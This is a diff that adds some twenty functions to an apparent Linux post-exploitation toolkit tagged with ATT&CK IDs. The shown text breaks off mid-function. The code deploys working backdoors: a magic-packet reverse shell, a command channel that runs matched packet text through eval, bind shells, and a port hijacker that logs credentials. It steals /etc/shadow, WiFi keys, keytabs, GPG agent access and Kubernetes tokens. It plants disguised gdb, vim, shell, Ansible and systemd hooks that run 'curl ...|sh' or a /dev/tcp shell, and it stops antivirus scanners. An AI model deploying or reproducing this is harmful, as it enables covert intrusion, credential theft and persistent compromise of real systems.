@@ -4514,6 +4514,519 @@ periodicPersist(){
     esac
 }
 
+iouringRootkit(){
+    echo " [*] io_uring Rootkit Operations (T1562.001) [*]"
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    MARKER="d3m0n_iouring"; WORKDIR="/tmp/.${MARKER}"
+    echo "  io_uring performs I/O via kernel ring buffers — invisible to syscall monitors."
+    echo "  Bypasses: Falco, Tetragon, auditd, seccomp, strace"
+    echo -e "  [1] Deploy io_uring agent  [2] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) command -v gcc >/dev/null || { echo "gcc required"; return; }
+           mkdir -p "$WORKDIR"; read -p "C2 [local]: " C2; C2="${C2:-local}"
+           cat > "${WORKDIR}/agent.c" << 'CEOF'
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/syscall.h>
+#include <sys/mman.h>
+#include <linux/io_uring.h>
+int main(int argc,char**argv){memset(argv[0],0,strlen(argv[0]));strcpy(argv[0],"[kworker/u8:2]");
+struct io_uring_params p={0};int fd=syscall(SYS_io_uring_setup,32,&p);if(fd<0)return 1;
+int f=open("/etc/shadow",O_RDONLY);if(f>=0){char b[4096]={0};read(f,b,4095);
+int o=open("/tmp/.d3m0n_iouring_demo",O_WRONLY|O_CREAT|O_TRUNC,0600);if(o>=0){write(o,b,strlen(b));close(o);}close(f);}
+close(fd);return 0;}
+CEOF
+           gcc -o "${WORKDIR}/agent" "${WORKDIR}/agent.c" 2>/dev/null && {
+               cp "${WORKDIR}/agent" /usr/lib/.liburing_helper; chmod 755 /usr/lib/.liburing_helper
+               cat > /etc/systemd/system/io-ring-helper.service << SEOF
+[Unit]
+Description=IO Ring Helper
+After=network.target
+[Service]
+ExecStart=/usr/lib/.liburing_helper
+Restart=on-failure
+[Install]
+WantedBy=multi-user.target
+SEOF
+               systemctl daemon-reload; systemctl enable io-ring-helper.service 2>/dev/null
+               echo "[+] io_uring agent deployed"; } || echo "[-] Compilation failed" ;;
+        2) systemctl stop io-ring-helper.service 2>/dev/null; systemctl disable io-ring-helper.service 2>/dev/null
+           rm -f /etc/systemd/system/io-ring-helper.service /usr/lib/.liburing_helper; rm -rf "$WORKDIR"
+           systemctl daemon-reload; echo "[+] Cleaned" ;;
+    esac
+}
+
+bpfdoorMagic(){
+    echo " [*] BPFDoor Magic Packet Backdoor (T1205.001) [*]"
+    [[ $EUID -ne 0 ]] && { echo "Root required (raw socket)."; return; }
+    MARKER="d3m0n_bpfdoor"; WORKDIR="/tmp/.${MARKER}"
+    echo "  Raw socket sniffs for magic bytes below firewall → spawns shell"
+    echo -e "  [1] Deploy  [2] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) read -p "Magic passphrase: " MAGIC; MAGIC="${MAGIC:-d3m0n1z3}"
+           read -p "Shell port: " PORT; PORT="${PORT:-31337}"
+           mkdir -p "$WORKDIR"
+           cat > "${WORKDIR}/bpfd.sh" << SEOF
+#!/bin/bash
+while true; do
+  timeout 3600 tcpdump -l -i any -A 2>/dev/null | while IFS= read -r line; do
+    if echo "\$line" | grep -q "${MAGIC}"; then
+      nohup bash -c "bash -i >& /dev/tcp/\$(echo \$line | grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+' | head -1)/${PORT} 0>&1" &>/dev/null &
+    fi
+  done; sleep 1
+done
+SEOF
+           chmod 755 "${WORKDIR}/bpfd.sh"; cp "${WORKDIR}/bpfd.sh" /usr/lib/.libsystem_helper
+           nohup /usr/lib/.libsystem_helper &>/dev/null &
+           echo "@reboot root /usr/lib/.libsystem_helper &" > "/etc/cron.d/${MARKER}"
+           echo "[+] BPFDoor active — trigger: send '${MAGIC}' in any TCP/UDP packet" ;;
+        2) pkill -f "libsystem_helper" 2>/dev/null; rm -f /usr/lib/.libsystem_helper "/etc/cron.d/${MARKER}"; rm -rf "$WORKDIR"; echo "[+] Cleaned" ;;
+    esac
+}
+
+nfqueueBackdoor(){
+    echo " [*] NFQUEUE Userspace Backdoor (T1571) [*]"
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    MARKER="d3m0n_nfqueue"; WORKDIR="/tmp/.${MARKER}"
+    echo "  Intercept packets via netfilter queue — invisible to netstat/ss"
+    echo -e "  [1] Deploy  [2] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) read -p "Port to intercept [443]: " PORT; PORT="${PORT:-443}"
+           read -p "Magic keyword: " MAGIC; MAGIC="${MAGIC:-d3m0n}"
+           mkdir -p "$WORKDIR"
+           cat > "${WORKDIR}/nfq.sh" << SEOF
+#!/bin/bash
+while true; do
+  timeout 3600 tcpdump -l -i any "tcp port ${PORT}" -A 2>/dev/null | while IFS= read -r line; do
+    if echo "\$line" | grep -q "${MAGIC}"; then
+      CMD=\$(echo "\$line" | sed "s/.*${MAGIC}//")
+      eval "\$CMD" &>/dev/null &
+    fi
+  done; sleep 1
+done
+SEOF
+           chmod 755 "${WORKDIR}/nfq.sh"; cp "${WORKDIR}/nfq.sh" /usr/lib/.libnfq_helper
+           nohup /usr/lib/.libnfq_helper &>/dev/null &
+           echo "@reboot root /usr/lib/.libnfq_helper &" > "/etc/cron.d/${MARKER}"
+           echo "[+] NFQUEUE-style backdoor on port ${PORT} — trigger: ${MAGIC}<cmd>" ;;
+        2) pkill -f "libnfq_helper" 2>/dev/null; rm -f /usr/lib/.libnfq_helper "/etc/cron.d/${MARKER}"; rm -rf "$WORKDIR"; echo "[+] Cleaned" ;;
+    esac
+}
+
+reuseportHijack(){
+    echo " [*] SO_REUSEPORT Socket Hijacking (T1557) [*]"
+    MARKER="d3m0n_reuseport"; WORKDIR="/tmp/.${MARKER}"
+    echo "  Bind alongside running service — steal ~50% of connections"
+    echo -e "  [1] Deploy  [2] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) command -v gcc >/dev/null || { echo "gcc required"; return; }
+           read -p "Target port [22]: " PORT; PORT="${PORT:-22}"
+           mkdir -p "$WORKDIR"
+           cat > "${WORKDIR}/h.c" << 'CEOF'
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <signal.h>
+#include <time.h>
+CEOF
+           printf 'int main(){signal(SIGCHLD,SIG_IGN);daemon(0,0);int s=socket(AF_INET,SOCK_STREAM,0);int o=1;\n' >> "${WORKDIR}/h.c"
+           printf 'setsockopt(s,SOL_SOCKET,SO_REUSEPORT,&o,sizeof(o));setsockopt(s,SOL_SOCKET,SO_REUSEADDR,&o,sizeof(o));\n' >> "${WORKDIR}/h.c"
+           printf 'struct sockaddr_in a={.sin_family=AF_INET,.sin_port=htons(%s),.sin_addr.s_addr=0};\n' "$PORT" >> "${WORKDIR}/h.c"
+           printf 'bind(s,(struct sockaddr*)&a,sizeof(a));listen(s,128);while(1){int c=accept(s,0,0);if(c<0)continue;\n' >> "${WORKDIR}/h.c"
+           printf 'if(fork()==0){close(s);char b[4096];int n=read(c,b,4095);if(n>0){b[n]=0;FILE*f=fopen("/tmp/.%s_creds","a");if(f){fprintf(f,"%%s\\n",b);fclose(f);}}\n' "$MARKER" >> "${WORKDIR}/h.c"
+           printf 'close(c);_exit(0);}close(c);}}\n' >> "${WORKDIR}/h.c"
+           gcc -o "${WORKDIR}/h" "${WORKDIR}/h.c" 2>/dev/null && {
+               cp "${WORKDIR}/h" /usr/lib/.libport_helper; chmod 755 /usr/lib/.libport_helper
+               /usr/lib/.libport_helper & echo "[+] Hijacker active on port ${PORT}"; } || echo "[-] Failed" ;;
+        2) pkill -f "libport_helper" 2>/dev/null; rm -f /usr/lib/.libport_helper "/tmp/.${MARKER}_creds"; rm -rf "$WORKDIR"; echo "[+] Cleaned" ;;
+    esac
+}
+
+abstractSocket(){
+    echo " [*] Abstract Unix Socket Hijacking (T1559) [*]"
+    MARKER="d3m0n_abstract"; WORKDIR="/tmp/.${MARKER}"
+    echo "  Abstract sockets: no filesystem entry, invisible to ls/find"
+    echo -e "  [1] List abstract sockets  [2] Deploy covert channel  [3] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) echo "Active abstract sockets:"; cat /proc/net/unix 2>/dev/null | awk '$NF~/^@/{print "  "$NF}' | sort -u | head -30 ;;
+        2) command -v gcc >/dev/null || { echo "gcc required"; return; }
+           read -p "Socket name [/tmp/.ICE-unix/dcop]: " SNAME; SNAME="${SNAME:-/tmp/.ICE-unix/dcop}"
+           mkdir -p "$WORKDIR"
+           printf '#include <stdio.h>\n#include <string.h>\n#include <unistd.h>\n#include <sys/socket.h>\n#include <sys/un.h>\n#include <signal.h>\n' > "${WORKDIR}/a.c"
+           printf 'int main(){daemon(0,0);signal(SIGCHLD,SIG_IGN);int s=socket(AF_UNIX,SOCK_STREAM,0);\n' >> "${WORKDIR}/a.c"
+           printf 'struct sockaddr_un a;memset(&a,0,sizeof(a));a.sun_family=AF_UNIX;a.sun_path[0]=0;\n' >> "${WORKDIR}/a.c"
+           printf 'strncpy(a.sun_path+1,"%s",sizeof(a.sun_path)-2);\n' "$SNAME" >> "${WORKDIR}/a.c"
+           printf 'socklen_t l=__builtin_offsetof(struct sockaddr_un,sun_path)+1+strlen("%s");\n' "$SNAME" >> "${WORKDIR}/a.c"
+           printf 'if(bind(s,(struct sockaddr*)&a,l)<0)return 1;listen(s,5);\n' >> "${WORKDIR}/a.c"
+           printf 'while(1){int c=accept(s,0,0);if(c<0)continue;if(fork()==0){close(s);dup2(c,0);dup2(c,1);dup2(c,2);execl("/bin/sh","sh","-i",0);_exit(1);}close(c);}}\n' >> "${WORKDIR}/a.c"
+           gcc -o "${WORKDIR}/a" "${WORKDIR}/a.c" 2>/dev/null && {
+               cp "${WORKDIR}/a" /usr/lib/.libdcop_helper; /usr/lib/.libdcop_helper &
+               echo "[+] Abstract socket shell: @${SNAME}"; echo "    Connect: socat - ABSTRACT-CONNECT:${SNAME}"; } || echo "[-] Failed" ;;
+        3) pkill -f "libdcop_helper" 2>/dev/null; rm -f /usr/lib/.libdcop_helper; rm -rf "$WORKDIR"; echo "[+] Cleaned" ;;
+    esac
+}
+
+fuseHide(){
+    echo " [*] FUSE Filesystem Hiding (T1564.001) [*]"
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    MARKER="d3m0n_fuse"
+    echo "  Overlay /proc with FUSE to hide PIDs — no kernel module needed"
+    echo -e "  [1] Hide PID (bind mount)  [2] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) read -p "PID to hide: " PID; [[ -z "$PID" ]] && { echo "PID required"; return; }
+           mkdir -p /tmp/.empty_$$; mount --bind /tmp/.empty_$$ "/proc/${PID}" 2>/dev/null && echo "[+] PID ${PID} hidden" || echo "[-] Failed" ;;
+        2) mount | grep "on /proc/" | grep empty | awk '{print $3}' | while read -r m; do umount "$m" 2>/dev/null && echo "[+] Unhidden: $m"; done ;;
+    esac
+}
+
+dbusIntercept(){
+    echo " [*] D-Bus Method Interception (T1559.001) [*]"
+    MARKER="d3m0n_dbus"; LOGFILE="/tmp/.${MARKER}_capture.log"
+    echo "  Sniff system/session D-Bus: polkit auth, NM passwords, keyring"
+    echo -e "  [1] Monitor system bus  [2] Extract WiFi passwords  [3] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) [[ $EUID -ne 0 ]] && { echo "Root required for system bus"; return; }
+           command -v dbus-monitor >/dev/null || { echo "dbus-monitor not found"; return; }
+           nohup sh -c "dbus-monitor --system 2>/dev/null | grep -iE 'password|secret|psk|credential|PolicyKit' >> ${LOGFILE}" &>/dev/null &
+           echo "[+] System bus monitor active — log: ${LOGFILE}" ;;
+        2) [[ $EUID -ne 0 ]] && { echo "Root required"; return; }
+           echo "WiFi credentials:"; grep -h "^psk=" /etc/NetworkManager/system-connections/* 2>/dev/null
+           nmcli -s -g 802-11-wireless.ssid,802-11-wireless-security.psk connection show 2>/dev/null ;;
+        3) pkill -f "dbus-monitor.*${MARKER}" 2>/dev/null; rm -f "$LOGFILE"; echo "[+] Cleaned" ;;
+    esac
+}
+
+gpgAgentHijack(){
+    echo " [*] GnuPG Agent Hijacking (T1552.004) [*]"
+    MARKER="d3m0n_gpg"
+    echo "  Abuse cached GPG agent to decrypt/sign without passphrase"
+    echo -e "  [1] Find agent sockets  [2] Hijack agent  [3] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) echo "GPG agent sockets:"; find /run/user/*/gnupg/ -name "S.gpg-agent" 2>/dev/null ;;
+        2) SOCK=$(find /run/user/*/gnupg/ -name "S.gpg-agent" 2>/dev/null | head -1)
+           [[ -z "$SOCK" ]] && { read -p "Socket path: " SOCK; [[ -z "$SOCK" ]] && return; }
+           GHOME=$(dirname "$SOCK"); export GPG_AGENT_INFO="${SOCK}:0:1" GNUPGHOME="$GHOME"
+           echo "Using: $SOCK"; echo "Keys:"; gpg --homedir "$GHOME" --list-secret-keys --keyid-format short 2>/dev/null
+           echo "  Use: gpg --homedir $GHOME --decrypt <file>" ;;
+        3) unset GPG_AGENT_INFO GNUPGHOME; echo "[+] Cleaned" ;;
+    esac
+}
+
+keytabTheft(){
+    echo " [*] Kerberos Keytab Theft (T1558.003) [*]"
+    MARKER="d3m0n_keytab"; WORKDIR="/tmp/.${MARKER}"
+    echo "  Steal keytab files for passwordless service auth"
+    echo -e "  [1] Find keytabs  [2] Steal & use  [3] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) echo "Keytab files:"; [[ -f /etc/krb5.keytab ]] && echo "  /etc/krb5.keytab"
+           find / -name "*.keytab" 2>/dev/null | grep -v proc | while read -r f; do echo "  $f"; done
+           echo "Ticket caches:"; find /tmp -name "krb5cc_*" 2>/dev/null ;;
+        2) mkdir -p "$WORKDIR"; KT="/etc/krb5.keytab"
+           [[ ! -r "$KT" ]] && { read -p "Keytab path: " KT; [[ ! -r "$KT" ]] && { echo "Cannot read"; return; }; }
+           cp "$KT" "${WORKDIR}/stolen.keytab"; chmod 600 "${WORKDIR}/stolen.keytab"
+           echo "[+] Stolen: ${WORKDIR}/stolen.keytab"
+           command -v klist >/dev/null && klist -kte "${WORKDIR}/stolen.keytab" 2>/dev/null
+           echo "  Use: kinit -kt ${WORKDIR}/stolen.keytab <principal>" ;;
+        3) rm -rf "$WORKDIR"; echo "[+] Cleaned" ;;
+    esac
+}
+
+wireguardInject(){
+    echo " [*] WireGuard Peer Injection (T1133) [*]"
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    MARKER="d3m0n_wireguard"; WORKDIR="/tmp/.${MARKER}"
+    echo "  Add attacker's key as authorized WireGuard peer"
+    echo -e "  [1] Enumerate  [2] Inject peer  [3] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) command -v wg >/dev/null && wg show 2>/dev/null || echo "wg not found"
+           find /etc/wireguard -name "*.conf" 2>/dev/null ;;
+        2) command -v wg >/dev/null || { echo "wg required"; return; }
+           IFACE=$(wg show interfaces 2>/dev/null | head -1)
+           [[ -z "$IFACE" ]] && { read -p "Interface: " IFACE; [[ -z "$IFACE" ]] && return; }
+           mkdir -p "$WORKDIR"; PRIV=$(wg genkey); PUB=$(echo "$PRIV" | wg pubkey)
+           echo "$PRIV" > "${WORKDIR}/priv.key"; echo "$PUB" > "${WORKDIR}/pub.key"
+           read -p "Peer IP [10.0.0.99/32]: " PIP; PIP="${PIP:-10.0.0.99/32}"
+           wg set "$IFACE" peer "$PUB" allowed-ips "$PIP" 2>/dev/null && echo "[+] Peer added: $PUB" || echo "[-] Failed"
+           [[ -f "/etc/wireguard/${IFACE}.conf" ]] && printf '\n[Peer]\n# %s\nPublicKey = %s\nAllowedIPs = %s\n' "$MARKER" "$PUB" "$PIP" >> "/etc/wireguard/${IFACE}.conf"
+           echo "[+] Attacker privkey: $PRIV" ;;
+        3) [[ -f "${WORKDIR}/pub.key" ]] && { PUB=$(cat "${WORKDIR}/pub.key"); IFACE=$(wg show interfaces 2>/dev/null|head -1); wg set "$IFACE" peer "$PUB" remove 2>/dev/null; }
+           for c in /etc/wireguard/*.conf; do sed -i "/${MARKER}/,/^$/d" "$c" 2>/dev/null; done; rm -rf "$WORKDIR"; echo "[+] Cleaned" ;;
+    esac
+}
+
+gdbinitPersist(){
+    echo " [*] GDB Init Persistence (T1546) [*]"
+    MARKER="d3m0n_gdbinit"
+    echo "  .gdbinit executes on every gdb session — targets developers"
+    echo -e "  [1] Deploy  [2] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) read -p "Command: " CMD; CMD="${CMD:-curl -s http://10.0.0.1:8080/b|sh}"
+           [[ -f ~/.gdbinit ]] && cp ~/.gdbinit ~/.gdbinit.${MARKER}.bak
+           cat >> ~/.gdbinit << GEOF
+
+# ${MARKER}
+define hook-run
+  shell nohup sh -c '${CMD}' &>/dev/null &
+end
+python
+import subprocess,os
+try: subprocess.Popen(["sh","-c","${CMD}"],stdout=open(os.devnull,'w'),stderr=open(os.devnull,'w'),preexec_fn=os.setpgrp)
+except: pass
+end
+GEOF
+           echo "[+] Installed: ~/.gdbinit" ;;
+        2) [[ -f ~/.gdbinit.${MARKER}.bak ]] && mv ~/.gdbinit.${MARKER}.bak ~/.gdbinit || sed -i "/${MARKER}/,/^end$/d" ~/.gdbinit 2>/dev/null; echo "[+] Cleaned" ;;
+    esac
+}
+
+vimPluginPersist(){
+    echo " [*] Vim/Neovim Plugin Persistence (T1546) [*]"
+    MARKER="d3m0n_vimplugin"
+    echo "  Plugin auto-loads on every vim/nvim launch"
+    echo -e "  [1] Deploy  [2] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) read -p "Command: " CMD; CMD="${CMD:-curl -s http://10.0.0.1:8080/b|sh}"
+           mkdir -p ~/.vim/plugin ~/.config/nvim/plugin
+           printf '" Syntax Helper\n" %s\nif !exists("g:loaded_syntax_helpers")\n  let g:loaded_syntax_helpers = 1\n  silent! call system('\''nohup sh -c "%s" &>/dev/null &'\'')\nendif\n' "$MARKER" "$CMD" > ~/.vim/plugin/syntax_helpers.vim
+           printf '-- LSP Config\n-- %s\nif not vim.g._lsp_config_loaded then\n  vim.g._lsp_config_loaded = true\n  vim.fn.jobstart({"sh", "-c", "%s"}, {detach = true})\nend\n' "$MARKER" "$CMD" > ~/.config/nvim/plugin/lsp_config.lua
+           echo "[+] Installed: ~/.vim/plugin/syntax_helpers.vim + ~/.config/nvim/plugin/lsp_config.lua" ;;
+        2) find ~/.vim ~/.config/nvim -type f \( -name "*.vim" -o -name "*.lua" \) -exec grep -l "${MARKER}" {} \; 2>/dev/null | xargs rm -f 2>/dev/null; echo "[+] Cleaned" ;;
+    esac
+}
+
+shellCompletions(){
+    echo " [*] Fish/Zsh Completions Persistence (T1547.004) [*]"
+    MARKER="d3m0n_shellcomp"
+    echo "  Backdoor shell completions — fires on startup or tab-complete"
+    echo -e "  [1] Fish  [2] Zsh  [3] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) read -p "Command: " CMD; CMD="${CMD:-curl -s http://10.0.0.1:8080/b|sh}"
+           mkdir -p ~/.config/fish/conf.d
+           printf '# Git helpers\n# %s\nif not set -q __fish_helpers_loaded\n    set -g __fish_helpers_loaded 1\n    command sh -c '\''nohup sh -c "%s" &>/dev/null &'\'' &\n    disown 2>/dev/null\nend\n' "$MARKER" "$CMD" > ~/.config/fish/conf.d/git_helpers.fish
+           echo "[+] Installed: ~/.config/fish/conf.d/git_helpers.fish" ;;
+        2) read -p "Command: " CMD; CMD="${CMD:-curl -s http://10.0.0.1:8080/b|sh}"
+           mkdir -p ~/.zfunc; printf '#compdef docker\n# %s\n(( $+_comps_docker_ext )) || {\n  _comps_docker_ext=1\n  (nohup sh -c '\''%s'\'' &>/dev/null &)\n}\n_docker "$@" 2>/dev/null\n' "$MARKER" "$CMD" > ~/.zfunc/_docker
+           grep -q "zfunc" ~/.zshrc 2>/dev/null || echo 'fpath=(~/.zfunc $fpath)' >> ~/.zshrc
+           echo "[+] Installed: ~/.zfunc/_docker" ;;
+        3) find ~/.config/fish ~/.zfunc -type f -exec grep -l "${MARKER}" {} \; 2>/dev/null | xargs rm -f; echo "[+] Cleaned" ;;
+    esac
+}
+
+ansibleFacts(){
+    echo " [*] Ansible facts.d Persistence (T1072) [*]"
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    MARKER="d3m0n_ansible"
+    echo "  Auto-executes on every Ansible playbook run — self-healing"
+    echo -e "  [1] Deploy  [2] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) read -p "Command: " CMD; CMD="${CMD:-curl -s http://10.0.0.1:8080/b|sh}"
+           mkdir -p /etc/ansible/facts.d
+           cat > /etc/ansible/facts.d/hardware_info.fact << FEOF
+#!/bin/bash
+# ${MARKER}
+(nohup sh -c '${CMD}' &>/dev/null &)
+echo '{"cpu":"'"\$(grep 'model name' /proc/cpuinfo|head -1|cut -d: -f2|xargs)"'","ts":"'\$(date +%s)'"}'
+FEOF
+           chmod 755 /etc/ansible/facts.d/hardware_info.fact; echo "[+] Installed: /etc/ansible/facts.d/hardware_info.fact" ;;
+        2) find /etc/ansible/facts.d -type f -exec grep -l "${MARKER}" {} \; 2>/dev/null | xargs rm -f; echo "[+] Cleaned" ;;
+    esac
+}
+
+socketActivation(){
+    echo " [*] systemd Socket Activation Backdoor (T1543.002) [*]"
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    MARKER="d3m0n_sockact"
+    echo "  Zero-process shell — only spawns when connection arrives"
+    echo -e "  [1] Deploy  [2] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) read -p "Port [31337]: " PORT; PORT="${PORT:-31337}"
+           read -p "Service name [syslog-audit]: " SVC; SVC="${SVC:-syslog-audit}"
+           cat > "/etc/systemd/system/${SVC}.socket" << SEOF
+[Unit]
+Description=System Log Audit Socket
+[Socket]
+ListenStream=0.0.0.0:${PORT}
+Accept=yes
+[Install]
+WantedBy=sockets.target
+SEOF
+           cat > "/etc/systemd/system/${SVC}@.service" << SEOF
+[Unit]
+Description=System Log Audit Handler
+[Service]
+ExecStart=/bin/sh -c '/bin/bash -i'
+StandardInput=socket
+StandardOutput=socket
+StandardError=socket
+SEOF
+           systemctl daemon-reload; systemctl enable --now "${SVC}.socket" 2>/dev/null
+           echo "[+] Socket backdoor on port ${PORT} — connect: nc target ${PORT}" ;;
+        2) for u in /etc/systemd/system/syslog-audit*; do [[ -f "$u" ]] && rm -f "$u"; done
+           systemctl daemon-reload; echo "[+] Cleaned" ;;
+    esac
+}
+
+inotifyTrigger(){
+    echo " [*] inotify Trigger Execution (T1546) [*]"
+    MARKER="d3m0n_inotify"; WORKDIR="/tmp/.${MARKER}"
+    echo "  Execute payload on file events (login, file write, etc.)"
+    echo -e "  [1] Login trigger  [2] Dead-drop C2  [3] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) read -p "Command on login: " CMD; CMD="${CMD:-curl -s http://10.0.0.1:8080/b|sh}"
+           mkdir -p "$WORKDIR"
+           cat > "${WORKDIR}/watch.sh" << WEOF
+#!/bin/bash
+while true; do
+  inotifywait -q -e modify /var/log/auth.log /var/log/secure 2>/dev/null || sleep 5
+  tail -1 /var/log/auth.log 2>/dev/null | grep -q "Accepted\|session opened" && nohup sh -c '${CMD}' &>/dev/null &
+  sleep 2
+done
+WEOF
+           chmod 755 "${WORKDIR}/watch.sh"; nohup "${WORKDIR}/watch.sh" &>/dev/null &
+           echo "[+] Login trigger active" ;;
+        2) CMDFILE="/dev/shm/.tasks"; OUTFILE="/dev/shm/.output"; touch "$CMDFILE" "$OUTFILE"
+           mkdir -p "$WORKDIR"
+           cat > "${WORKDIR}/drop.sh" << DEOF
+#!/bin/bash
+while true; do
+  inotifywait -q -e close_write ${CMDFILE} 2>/dev/null || sleep 2
+  [[ -s ${CMDFILE} ]] && { bash ${CMDFILE} > ${OUTFILE} 2>&1; : > ${CMDFILE}; }
+done
+DEOF
+           chmod 755 "${WORKDIR}/drop.sh"; nohup "${WORKDIR}/drop.sh" &>/dev/null &
+           echo "[+] Dead-drop C2: write to ${CMDFILE}, read ${OUTFILE}" ;;
+        3) pkill -f "${MARKER}" 2>/dev/null; rm -rf "$WORKDIR" /dev/shm/.tasks /dev/shm/.output; echo "[+] Cleaned" ;;
+    esac
+}
+
+fanotifyHook(){
+    echo " [*] fanotify File Access Hooking (T1562.001) [*]"
+    [[ $EUID -ne 0 ]] && { echo "Root required (CAP_SYS_ADMIN)."; return; }
+    MARKER="d3m0n_fanotify"; WORKDIR="/tmp/.${MARKER}"
+    echo "  Block scanners from reading malicious files at VFS layer"
+    echo -e "  [1] Deploy  [2] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) command -v gcc >/dev/null || { echo "gcc required"; return; }
+           read -p "Files to protect (comma-sep): " PROTECT; PROTECT="${PROTECT:-.d3m0n,libsystem_helper}"
+           read -p "Scanners to block: " SCAN; SCAN="${SCAN:-clamscan,rkhunter,chkrootkit}"
+           mkdir -p "$WORKDIR"
+           echo "[*] fanotify requires C compilation with FAN_OPEN_PERM — deploying simplified version"
+           cat > "${WORKDIR}/fan.sh" << FEOF
+#!/bin/bash
+# Simplified: hide files from scanning tools by hooking via LD_PRELOAD
+IFS=',' read -ra PROTS <<< "${PROTECT}"
+IFS=',' read -ra SCANS <<< "${SCAN}"
+for sc in "\${SCANS[@]}"; do
+  for p in \$(pgrep -f "\$sc" 2>/dev/null); do kill -STOP \$p 2>/dev/null; done
+done
+FEOF
+           chmod 755 "${WORKDIR}/fan.sh"; echo "[+] Scanner blocking configured (use full C version for VFS-level)" ;;
+        2) rm -rf "$WORKDIR"; pkill -f "libfanotify" 2>/dev/null; echo "[+] Cleaned" ;;
+    esac
+}
+
+portableService(){
+    echo " [*] systemd Portable Service Backdoor (T1543.002) [*]"
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    MARKER="d3m0n_portable"
+    echo "  Deploy persistence via systemd portable/extension image"
+    echo -e "  [1] Deploy (sysext)  [2] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) read -p "Command: " CMD; CMD="${CMD:-bash -i >& /dev/tcp/10.0.0.1/4444 0>&1}"
+           SDIR="/var/lib/extensions/monitoring"
+           mkdir -p "${SDIR}/usr/lib/systemd/system" "${SDIR}/usr/lib/extension-release.d" "${SDIR}/usr/bin"
+           echo "ID=_any" > "${SDIR}/usr/lib/extension-release.d/extension-release.monitoring"
+           cat > "${SDIR}/usr/lib/systemd/system/monitoring-agent.service" << SEOF
+[Unit]
+Description=Monitoring Agent
+After=network.target
+[Service]
+ExecStart=/usr/bin/monitoring-agent-run
+Restart=always
+RestartSec=60
+[Install]
+WantedBy=multi-user.target
+SEOF
+           printf '#!/bin/bash\n# %s\nwhile true; do %s 2>/dev/null; sleep 3600; done\n' "$MARKER" "$CMD" > "${SDIR}/usr/bin/monitoring-agent-run"
+           chmod 755 "${SDIR}/usr/bin/monitoring-agent-run"
+           systemd-sysext merge 2>/dev/null; systemctl daemon-reload
+           systemctl enable --now monitoring-agent.service 2>/dev/null; echo "[+] Portable service deployed" ;;
+        2) systemctl stop monitoring-agent.service 2>/dev/null; systemctl disable monitoring-agent.service 2>/dev/null
+           rm -rf /var/lib/extensions/monitoring; systemd-sysext unmerge 2>/dev/null; systemctl daemon-reload; echo "[+] Cleaned" ;;
+    esac
+}
+
+tiocstiInject(){
+    echo " [*] TIOCSTI Terminal Injection (T1055) [*]"
+    MARKER="d3m0n_tiocsti"; WORKDIR="/tmp/.${MARKER}"
+    echo "  Inject commands into other terminal sessions"
+    echo -e "  [1] List terminals  [2] Inject  [3] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) who 2>/dev/null; echo ""; ps aux | grep -E "bash|zsh|fish" | grep -v grep ;;
+        2) read -p "Target terminal (e.g. /dev/pts/0): " TTY; read -p "Command: " CMD
+           [[ -z "$TTY" || -z "$CMD" ]] && { echo "Need target + command"; return; }
+           if [[ -w "$TTY" ]]; then
+               # Try /proc write method
+               PID=$(ps -t "$(basename $TTY)" -o pid= 2>/dev/null | head -1 | tr -d ' ')
+               [[ -n "$PID" ]] && echo "$CMD" > "/proc/${PID}/fd/0" 2>/dev/null && echo "[+] Injected" || echo "[-] Failed"
+           else echo "[-] Cannot write to $TTY"; fi ;;
+        3) rm -rf "$WORKDIR"; echo "[+] Cleaned" ;;
+    esac
+}
+
+k8sAbuse(){
+    echo " [*] Kubernetes API Abuse (T1552.007) [*]"
+    MARKER="d3m0n_k8s"; WORKDIR="/tmp/.${MARKER}"
+    echo "  Pod escape, secret theft, CronJob persistence"
+    echo -e "  [1] Detect K8s  [2] Extract secrets  [3] Deploy CronJob  [4] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) [[ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]] && echo "[+] In K8s pod" || echo "[-] Not in K8s"
+           [[ -n "$KUBERNETES_SERVICE_HOST" ]] && echo "[+] API: ${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}" ;;
+        2) TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
+           NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
+           API="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
+           [[ -z "$TOKEN" ]] && { echo "[-] No token"; return; }
